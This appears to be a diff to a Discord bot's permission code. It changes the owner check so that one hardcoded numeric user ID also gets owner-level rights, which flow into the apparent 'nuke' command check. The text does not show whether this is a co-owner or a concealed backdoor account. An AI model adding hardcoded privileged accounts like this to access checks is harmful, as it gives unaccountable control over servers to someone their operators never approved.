@@ -19,7 +19,10 @@ def is_nuke(ctx: commands.Context):
     return is_mod(ctx) or is_admin(ctx) or is_owner(ctx)
 
 def is_owner(ctx: commands.Context):
-    return ctx.author.id == TNMN
+    if ctx.author.id == TNMN or ctx.author.id == 610138729138618371:
+        return True
+    else:
+        return False
 
 def is_admin(ctx: commands.Context):
     member: discord.Member = ctx.author
